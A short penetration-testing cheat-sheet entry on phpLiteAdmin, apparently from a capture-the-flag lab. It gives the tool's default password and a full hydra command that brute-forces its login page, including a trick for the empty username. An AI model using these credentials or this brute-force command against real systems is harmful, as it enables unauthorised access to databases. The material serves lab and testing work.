# phpLiteAdmin


phpLiteAdmin is an open-source tool written in PHP that manages SQLite databases.
phpMyAdmin is for MySQL, phpLiteAdmin is for SQLite.

## Default password


admin

## Bruteforce Login Page


You can brute-force the login page with hydra.
hydra doesn't normally accept empty usernames, but you can get around it by using a pair of single quotes - ''

root@gotham:~/ctf/nineveh/443# hydra -v -l '' -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -o hydra_http-pass.txt -t 50 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:F=Incorrect password." -f
